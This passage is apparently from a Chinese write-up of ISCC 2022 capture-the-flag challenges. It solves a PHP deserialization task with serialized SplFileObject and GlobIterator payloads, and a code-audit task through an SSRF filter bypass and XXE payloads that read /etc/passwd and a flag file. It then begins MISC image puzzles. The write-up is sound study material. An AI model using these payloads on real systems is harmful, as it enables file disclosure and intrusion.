<span class="line" data-line="28"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> 'Your output: '</span><span style="color:#F97583">.</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">un4;</span></span>
<span class="line" data-line="29"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="30"><span style="color:#E1E4E8">    </span></span>
<span class="line" data-line="31"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> giao</span><span style="color:#E1E4E8">(){</span></span>
<span class="line" data-line="32"><span style="color:#F97583">        @</span><span style="color:#79B8FF">eval</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">un2);</span></span>
<span class="line" data-line="33"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="34"><span style="color:#E1E4E8">    </span></span>
<span class="line" data-line="35"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __wakeup</span><span style="color:#E1E4E8">(){</span></span>
<span class="line" data-line="36"><span style="color:#F97583">        include</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583"> -></span><span style="color:#E1E4E8"> un2</span><span style="color:#F97583">.</span><span style="color:#9ECBFF">'hint.php'</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="38"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="39"></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">$data </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">'data'</span><span style="color:#E1E4E8">];</span></span>
<span class="line" data-line="41"><span style="color:#79B8FF">unserialize</span><span style="color:#E1E4E8">($data);</span></span></code></pre>
<hr>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
<span class="line" data-line="2"><span style="color:#F97583">Class</span><span style="color:#B392F0"> a</span><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="3"><span style="color:#F97583">	public</span><span style="color:#E1E4E8"> $un0</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'SplFileObject'</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="4"><span style="color:#F97583">	public</span><span style="color:#E1E4E8"> $un1</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'php://filter/read=convert.base64-encode/resource=hint.php'</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="5"><span style="color:#F97583">	public</span><span style="color:#E1E4E8"> $un2</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="6"><span style="color:#F97583">	public</span><span style="color:#E1E4E8"> $un3</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'unserialize'</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="7"><span style="color:#F97583">	public</span><span style="color:#E1E4E8"> $un4</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="9"></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">$data </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> a</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="11"><span style="color:#79B8FF">echo</span><span style="color:#79B8FF"> urlencode</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">($data));</span></span>
<span class="line" data-line="12"><span style="color:#F97583">?></span></span></code></pre>
<hr>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#79B8FF">data</span><span style="color:#F97583">=</span><span style="color:#79B8FF">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"a"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"un0"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">13</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"SplFileObject"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"un1"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">57</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"php://filter/read=convert.base64-encode/resource=hint.php"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"un2"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">N</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"un3"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">11</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"unserialize"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"un4"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">N</span><span style="color:#E1E4E8">;}</span></span></code></pre>
<p>请求后页面新增回显</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>Your output: PD9waHANCiRhID0gJ2ZsYWflnKjlvZPliY3nm67lvZXkuIvku6XlrZfmr41m5byA5aS055qEdHh05LitLOaXoOazleeIhuegtOWHuuadpSc7</span></span></code></pre>
<p><code>base64</code> 解码后得到</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">$a </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'flag在当前目录下以字母f开头的txt中,无法爆破出来'</span><span style="color:#E1E4E8">;</span></span></code></pre>
<hr>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
<span class="line" data-line="2"><span style="color:#F97583">Class</span><span style="color:#B392F0"> a</span><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="3"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $un0</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'GlobIterator'</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="4"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $un1</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'f*.txt'</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="5"><span style="color:#6A737D">	//  使用DirectoryIterator也行</span></span>
<span class="line" data-line="6"><span style="color:#6A737D">	// 	public $un0='DirectoryIterator';</span></span>
<span class="line" data-line="7"><span style="color:#6A737D">	// 	public $un1='glob://f*.txt';</span></span>
<span class="line" data-line="8"><span style="color:#F97583">	public</span><span style="color:#E1E4E8"> $un2</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="9"><span style="color:#F97583">	public</span><span style="color:#E1E4E8"> $un3</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'unserialize'</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="10"><span style="color:#F97583">	public</span><span style="color:#E1E4E8"> $un4</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="12"></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">$data </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> a</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="14"><span style="color:#79B8FF">echo</span><span style="color:#79B8FF"> urlencode</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">($data));</span></span>
<span class="line" data-line="15"><span style="color:#F97583">?></span></span></code></pre>
<hr>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#79B8FF">data</span><span style="color:#F97583">=</span><span style="color:#79B8FF">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"a"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"un0"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">12</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"GlobIterator"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"un1"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"f*.txt"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"un2"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">N</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"un3"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">11</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"unserialize"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"un4"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">N</span><span style="color:#E1E4E8">;}</span></span></code></pre>
<p>请求后页面新增回显</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>Your output: fA07TE_G19nde_OR1Der5r.txt</span></span></code></pre>
<p>直接访问：<a href="http://59.110.159.206:8030/fA07TE_G19nde_OR1Der5r.txt">http://59.110.159.206:8030/fA07TE_G19nde_OR1Der5r.txt</a> 得到flag</p>
<h3 id="这是一道代码审计题">这是一道代码审计题</h3>
<blockquote>
<p>遇到问题读源代码</p>
</blockquote>
<p>访问题目页面显示 <code>/index</code> 请求后一直 <code>404</code> …突然发现 <code>cookies</code> 有个 <code>login</code> 参数，直接 <code>0</code> 改为 <code>1</code> 页面显示正常了(我在Chrome需要改login参数而在Edge则直接不需要修改</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518195414346.png" alt="image-20220518195414346"></p>
<p>根据题目要求构建请求参数 <code>/index?url=127.0.0.1</code> 源代码中得到一段 <code>base100</code> 编码，解码后得到题目源码。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518082840858.png" alt="image-20220518082840858"></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">def</span><span style="color:#B392F0"> geneSign</span><span style="color:#E1E4E8">():</span></span>
<span class="line" data-line="2"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(control_key</span><span style="color:#F97583">==</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="3"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> render_template(</span><span style="color:#9ECBFF">"index.html"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="4"><span style="color:#F97583">    else</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="5"><span style="color:#F97583">        return</span><span style="color:#9ECBFF"> "You have not access to this page!"</span></span>
<span class="line" data-line="6"></span>
<span class="line" data-line="7"><span style="color:#F97583">def</span><span style="color:#B392F0"> check_ssrf</span><span style="color:#E1E4E8">(url):</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">    hostname </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> urlparse(url).hostname</span></span>
<span class="line" data-line="9"><span style="color:#F97583">    try</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="10"><span style="color:#F97583">        if</span><span style="color:#F97583"> not</span><span style="color:#E1E4E8"> re.match(</span><span style="color:#9ECBFF">'https?://(?:[-\w.]|(?:%[\da-fA-F]</span><span style="color:#79B8FF">{2}</span><span style="color:#9ECBFF">))+'</span><span style="color:#E1E4E8">, url):</span></span>
<span class="line" data-line="11"><span style="color:#F97583">            if</span><span style="color:#F97583"> not</span><span style="color:#E1E4E8"> re.match(</span><span style="color:#9ECBFF">'https?://@(?:[-\w.]|(?:%[\da-fA-F]</span><span style="color:#79B8FF">{2}</span><span style="color:#9ECBFF">))+'</span><span style="color:#E1E4E8">, url):</span></span>
<span class="line" data-line="12"><span style="color:#F97583">                raise</span><span style="color:#79B8FF"> BaseException</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"url format error"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="13"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">  re.match(</span><span style="color:#9ECBFF">'https?://@(?:[-\w.]|(?:%[\da-fA-F]</span><span style="color:#79B8FF">{2}</span><span style="color:#9ECBFF">))+'</span><span style="color:#E1E4E8">, url):</span></span>
<span class="line" data-line="14"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> judge_ip(hostname):</span></span>
<span class="line" data-line="15"><span style="color:#F97583">                return</span><span style="color:#79B8FF"> True</span></span>
<span class="line" data-line="16"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> False</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"You not get the right clue!"</span></span>
<span class="line" data-line="17"><span style="color:#F97583">        else</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">            ip_address </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> socket.getaddrinfo(hostname,</span><span style="color:#9ECBFF">'http'</span><span style="color:#E1E4E8">)[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">][</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">][</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="19"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> is_inner_ipaddress(ip_address):</span></span>
<span class="line" data-line="20"><span style="color:#F97583">                return</span><span style="color:#79B8FF"> False</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"inner ip address attack"</span></span>
<span class="line" data-line="21"><span style="color:#F97583">            else</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="22"><span style="color:#F97583">                return</span><span style="color:#79B8FF"> False</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"You not get the right clue!"</span></span>
<span class="line" data-line="23"><span style="color:#F97583">    except</span><span style="color:#79B8FF"> BaseException</span><span style="color:#F97583"> as</span><span style="color:#E1E4E8"> e:</span></span>
<span class="line" data-line="24"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> False</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(e)</span></span>
<span class="line" data-line="25"><span style="color:#F97583">    except</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="26"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> False</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"unknow error"</span></span>
<span class="line" data-line="27"></span>
<span class="line" data-line="28"><span style="color:#F97583">def</span><span style="color:#B392F0"> ip2long</span><span style="color:#E1E4E8">(ip_addr):</span></span>
<span class="line" data-line="29"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> struct.unpack(</span><span style="color:#9ECBFF">"!L"</span><span style="color:#E1E4E8">, socket.inet_aton(ip_addr))[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="30"></span>
<span class="line" data-line="31"><span style="color:#F97583">def</span><span style="color:#B392F0"> is_inner_ipaddress</span><span style="color:#E1E4E8">(ip):</span></span>
<span class="line" data-line="32"><span style="color:#E1E4E8">    ip </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ip2long(ip)</span></span>
<span class="line" data-line="33"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(ip)</span></span>
<span class="line" data-line="34"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> ip2long(</span><span style="color:#9ECBFF">'127.0.0.0'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 24</span><span style="color:#F97583"> ==</span><span style="color:#E1E4E8"> ip </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 24</span><span style="color:#F97583"> or</span><span style="color:#E1E4E8"> ip2long(</span><span style="color:#9ECBFF">'10.0.0.0'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 24</span><span style="color:#F97583"> ==</span><span style="color:#E1E4E8"> ip </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 24</span><span style="color:#F97583"> or</span><span style="color:#E1E4E8"> ip2long(</span><span style="color:#9ECBFF">'172.16.0.0'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 20</span><span style="color:#F97583"> ==</span><span style="color:#E1E4E8"> ip </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 20</span><span style="color:#F97583"> or</span><span style="color:#E1E4E8"> ip2long(</span><span style="color:#9ECBFF">'192.168.0.0'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 16</span><span style="color:#F97583"> ==</span><span style="color:#E1E4E8"> ip </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 16</span><span style="color:#F97583"> or</span><span style="color:#E1E4E8"> ip2long(</span><span style="color:#9ECBFF">'0.0.0.0'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 24</span><span style="color:#F97583"> ==</span><span style="color:#E1E4E8"> ip </span><span style="color:#F97583">>></span><span style="color:#79B8FF"> 24</span></span>
<span class="line" data-line="35"></span>
<span class="line" data-line="36"><span style="color:#F97583">def</span><span style="color:#B392F0"> waf1</span><span style="color:#E1E4E8">(ip):</span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">    forbidden_list </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [ </span><span style="color:#9ECBFF">'.'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'0'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'1'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'2'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'7'</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="38"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> word </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> forbidden_list:</span></span>
<span class="line" data-line="39"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> ip </span><span style="color:#F97583">and</span><span style="color:#E1E4E8"> word:</span></span>
<span class="line" data-line="40"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> word </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> ip.lower():</span></span>
<span class="line" data-line="41"><span style="color:#F97583">                return</span><span style="color:#79B8FF"> True</span></span>
<span class="line" data-line="42"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> False</span></span>
<span class="line" data-line="43"></span>
<span class="line" data-line="44"><span style="color:#F97583">def</span><span style="color:#B392F0"> judge_ip</span><span style="color:#E1E4E8">(ip):</span></span>
<span class="line" data-line="45"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(waf1(ip)):</span></span>
<span class="line" data-line="46"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> Fasle</span></span>
<span class="line" data-line="47"><span style="color:#F97583">    else</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="48"><span style="color:#E1E4E8">        addr </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> addr.encode(</span><span style="color:#FFAB70">encoding</span><span style="color:#F97583"> =</span><span style="color:#9ECBFF"> "utf-8"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="49"><span style="color:#E1E4E8">        ipp </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> base64.encodestring(addr)</span></span>
<span class="line" data-line="50"><span style="color:#E1E4E8">        ipp </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ipp.strip().lower().decode()</span></span>
<span class="line" data-line="51"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(ip</span><span style="color:#F97583">==</span><span style="color:#E1E4E8">ipp):</span></span>
<span class="line" data-line="52"><span style="color:#F97583">            global</span><span style="color:#E1E4E8"> control_key</span></span>
<span class="line" data-line="53"><span style="color:#E1E4E8">            control_key </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span></span>
<span class="line" data-line="54"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> True</span></span>
<span class="line" data-line="55"><span style="color:#F97583">        else</span><span style="color:#E1E4E8">:</span></span>
<span class="line" data-line="56"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> False</span></span></code></pre>
<p>很明显是构建 <code>SSRF</code> ，加个 <code>@</code> 绕过 <code>waf</code> 并把<code>127.0.0.1</code> <code>base64</code>编码一下构造绕过 <code>/index?url=http://@MTI3LjAuMC4x</code></p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518083052199.png" alt="image-20220518083052199"></p>
<p>访问 <code>/mti3ljaumc4x</code> 同时按照题目要求设置好 <code>Cookie</code>。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518083153927.png" alt="image-20220518083153927"></p>
<p>测试发现存在 <code>XXE</code></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="xml"><code><span class="line" data-line="1"><span style="color:#E1E4E8">&#x3C;?</span><span style="color:#85E89D">xml</span><span style="color:#B392F0"> version</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"1.0"</span><span style="color:#E1E4E8">?></span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">&#x3C;!</span><span style="color:#F97583">DOCTYPE</span><span style="color:#79B8FF"> user</span><span style="color:#E1E4E8">[</span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">&#x3C;!</span><span style="color:#F97583">ENTITY</span><span style="color:#79B8FF"> name</span><span style="color:#F97583"> SYSTEM </span><span style="color:#9ECBFF">"file:///etc/passwd"</span><span style="color:#E1E4E8">>]></span></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">user</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">name</span><span style="color:#E1E4E8">></span><span style="color:#79B8FF">&#x26;name;</span><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">name</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="6"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">password</span><span style="color:#E1E4E8">></span><span style="color:#79B8FF">&#x26;name;</span><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">password</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">user</span><span style="color:#E1E4E8">></span></span></code></pre>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518083425392.png" alt="image-20220518083425392"></p>
<p>直接拿到FLAG</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="xml"><code><span class="line" data-line="1"><span style="color:#E1E4E8">POST /mti3ljaumc4x/codelogin HTTP/1.1</span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">Host: 59.110.159.206:8040</span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">Cookie: login=0; a_cookie=aW4gZmFjdCBjb29raWUgaXMgdXNlZnVsIQ==</span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">Content-Length: 163</span></span>
<span class="line" data-line="6"></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">&#x3C;?</span><span style="color:#85E89D">xml</span><span style="color:#B392F0"> version</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"1.0"</span><span style="color:#E1E4E8">?></span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">&#x3C;!</span><span style="color:#F97583">DOCTYPE</span><span style="color:#79B8FF"> user</span><span style="color:#E1E4E8">[</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">&#x3C;!</span><span style="color:#F97583">ENTITY</span><span style="color:#79B8FF"> name</span><span style="color:#F97583"> SYSTEM </span><span style="color:#9ECBFF">"file:///proc/self/cwd/flag.txt"</span><span style="color:#E1E4E8">>]></span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">user</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">name</span><span style="color:#E1E4E8">></span><span style="color:#79B8FF">&#x26;name;</span><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">name</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">password</span><span style="color:#E1E4E8">></span><span style="color:#79B8FF">&#x26;name;</span><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">password</span><span style="color:#E1E4E8">></span></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">user</span><span style="color:#E1E4E8">></span></span></code></pre>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220518082754163.png" alt="image-20220518082754163"></p>
<h2 id="misc">MISC</h2>
<h3 id="单板小将苏翊鸣">单板小将苏翊鸣</h3>
<blockquote>
<p>在此次冬季奥运会项目中，17岁的单板小将苏翊鸣在单板项目中获得一金一银的优异成绩，打破了多年来中国队的历史最好成绩，为中国队此次冬奥之行锦上添花。</p>
</blockquote>
<p>打开后俩文件 <code>原图.png</code> 和 加密压缩包<code>flag.rar</code>，很明显图片缺半截，我们直接高度改为 <code>1000px</code></p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220502111843888.png" alt="image-20220502111843888"></p>
<p>多出来的像素出现了二维码，直接扫码，得到一段 <code>unicode</code> ，解密后得到</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>在这次冬奥会的舞台上，我国小将苏翊鸣斩获一金一银，那你知道此次冬奥会我国总共获得几枚奖牌吗？又分别是几金几银几铜呢？</span></span></code></pre>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220502112028976.png" alt="image-20220502112028976"></p>
<p>根据提示搜索一番，得到 <code>flag.rar</code> 解压密码 <code>15942</code> 其实这种弱密码我觉得爆破更快一些2333，解压后得到flag。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220502112151946.png" alt="image-20220502112151946"></p>
<h3 id="降维打击">降维打击</h3>
<blockquote>
<p>降维打击</p>
</blockquote>
<p>附件图片是《魔女之旅》中的伊蕾娜，我们用 <code>foremost</code> 分离出另一张图片</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220502112940882.png" alt="image-20220502112940882"></p>
